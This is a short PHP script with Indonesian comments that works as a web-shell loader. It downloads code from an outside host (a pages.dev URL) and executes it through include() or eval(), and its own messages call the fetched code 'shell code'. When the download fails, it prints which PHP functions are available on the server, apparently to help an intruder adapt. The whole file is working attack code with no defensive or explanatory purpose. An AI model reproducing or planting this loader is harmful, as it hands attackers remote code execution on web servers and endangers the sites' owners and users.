<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Langsung include dari URL kalo allow_url_include enabled
$url = "https://blackboys.pages.dev/cgi/hitam.txt";

// Method direct include
if(@ini_get('allow_url_include')) {
    include($url);
} 
// Method file_get_contents + eval
else {
    $code = @file_get_contents($url);
    if($code && strlen($code) > 10) {
        eval('?>' . $code);
    } else {
        echo "Failed to fetch shell code\n";
        
        // Debug info
        echo "PHP functions check:\n";
        echo "file_get_contents: " . (function_exists('file_get_contents') ? "OK" : "Disabled") . "\n";
        echo "curl_exec: " . (function_exists('curl_exec') ? "OK" : "Disabled") . "\n";
        echo "allow_url_fopen: " . (@ini_get('allow_url_fopen') ? "On" : "Off") . "\n";
    }
}
?>
